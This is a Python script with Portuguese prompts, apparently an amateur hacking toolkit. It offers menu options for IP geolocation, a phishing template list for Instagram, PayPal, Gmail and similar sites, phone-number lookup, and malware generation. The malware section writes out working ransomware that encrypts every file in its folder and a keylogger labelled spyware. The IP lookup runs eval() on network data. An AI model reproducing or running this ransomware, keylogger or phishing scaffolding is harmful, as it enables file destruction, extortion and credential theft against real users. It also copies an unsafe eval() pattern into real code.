#bibliotecas
from urllib.request import urlopen 
import sys
import os
import subprocess
from cryptography.fernet import Fernet
import shutil
import phonenumbers

print("1 - Geolocalizar ip")
print("2 - phishing")
print("3 - Malware")
print("4 - Obter informações de número")
print("5 - Rastrear alvo")
print("0 - sair")
resposta = int(input('O que você precisa hoje? '))




if resposta == 1:
    try: 
        ip = input('Insira o endereço de ip: ')

        if ip: 
            url = f"http://ip-api.com/json/{ip}"

            request = urlopen(url)
            data = request.read().decode()

            data = eval(data)

            for i in data:
                print(f"{i} == {data[i]}")


    except Exception as  ex:
        print(f"Error: (ex)")

#selecionar qual será o site que vamos usar para atacar o alvo
#criar link de phishing
#arrumar links de phishing para evitar que fique muito na cara
#preparar link de phishing para todos poderem conectar 

if resposta == 2: 
    print("Templates")

    print("[1] Instagram          [2] Facebook            [3] Snapchat")
    print("[4] Twitter            [5] GitHub              [6] Gmail")
    print("[7] Spotify            [8] Netflix             [9] PayPal")
    print("[10] Microsoft         [11] Steam              [12] Yahoo")
    print("[13] LinkedIn          [14] Protonmail         [15] Wordpress")
    print("[16] Pinterest         [17] Twitch             [18] Discord")
    print("[19] Disney +          [20] Star +             [21] Hbo max")

    templates = {
        '1':'instagram',
        '2': 'facebook',
        '3': 'snapchat',
        '4': 'twitter',
        '5': 'github',
        '6': 'Gmail',
        '7': 'spotify',
        '8': 'netflix',
        '9': 'paypal',
        '10': 'Microsoft',
        '11': 'steam',
        '12': 'yahoo',
        '13': 'linkedin',
        '14': 'protonmail',
        '15': 'wordpress',
        '16': 'Pinterest',
        '17': 'Twitch',
        '18': 'Discord',
        '19': 'Disney +',
        '20': 'Star +',
        '21': 'Hbo max',
        }


if resposta == 3:
    print("1 - Ransomware")
    print("2 - Spyware")
    print("3 - Trojan")
    print("0 - Sair")

    resposta = int(input("Insira o número do vírus que você deseja criar: "))

    def criar_arquivo_malware(nome_arquivo, codigo_malware):
        with open(nome_arquivo, "w") as arquivo:
            arquivo.write(codigo_malware)

    def enviar_codigo(nome_arquivo, pasta_destino):
        shutil.move(nome_arquivo, pasta_destino)

    if resposta == 1:
        pasta_destino = "C:\\Users\\Rafael\\Desktop\\Luan\\scripts\\python\\geoport\\malwares"
        nome_arquivo = "ransomware.py"
        codigo_malware = """import os
from cryptography.fernet import Fernet

files = []

key = Fernet.generate_key()

with open("chave.key", "wb") as chave:
    chave.write(key)

for file in os.listdir():
    if file =="ransomware.py" or file == "chave.key":  
        continue
    if os.path.isfile(file):
        files.append(file)
 
for file in files:
    with open(file, "rb") as arquivo:
        conteudo = arquivo.read()
    conteudo_encrypted = Fernet(key).encrypt(conteudo)
    with open(file, "wb") as arquivo:
        arquivo.write(conteudo_encrypted)
            """
        criar_arquivo_malware(nome_arquivo, codigo_malware)
        enviar_codigo(nome_arquivo, pasta_destino)


        print(f"Arquivo ransomware criado com sucesso: {nome_arquivo}") 

    if resposta == 2:
        pasta_destino = "C:\\Users\\Rafael\\Desktop\\Luan\\scripts\\python\\geoport\\malwares"
        nome_arquivo = "spyware.py"
        codigo_malware = """from pynput.keyboard import Listener

def log(teclado):
    with open('log.txt', 'a') as arquivo_log:
        arquivo_log.write(str(teclado))

with Listener(on_press=log) as monitor:
    monitor.join()"""

        criar_arquivo_malware(nome_arquivo, codigo_malware)
        enviar_codigo(nome_arquivo, pasta_destino)
        print(f"Arquivo spyware criado com sucesso: {nome_arquivo}") 
    
    if resposta == 3:
        pasta_destino = "C:\\Users\\Rafael\\Desktop\\Luan\\scripts\\python\\geoport\\malwares"
        nome_arquivo = "trojan.py"
        codigo_malware = """"""

        criar_arquivo_malware(nome_arquivo, codigo_malware)
        enviar_codigo(nome_arquivo, pasta_destino)
        print(f"Arquivo trojan criado com sucesso: {nome_arquivo}")

if resposta == 4: 

    from phonenumbers import geocoder
    from phonenumbers import carrier

    resposta = str(input("Insira o número que você deseja obter as informações(sem ddd): "))

    numero = phonenumbers.parse(resposta, 'BR')
    telefone = phonenumbers.format_number(numero, phonenumbers.PhoneNumberFormat.NATIONAL)
    print(telefone)
    
    print(numero)
    print(geocoder.description_for_number(numero, 'BR'))
    print(carrier.name_for_number(telefone, 'BR'))
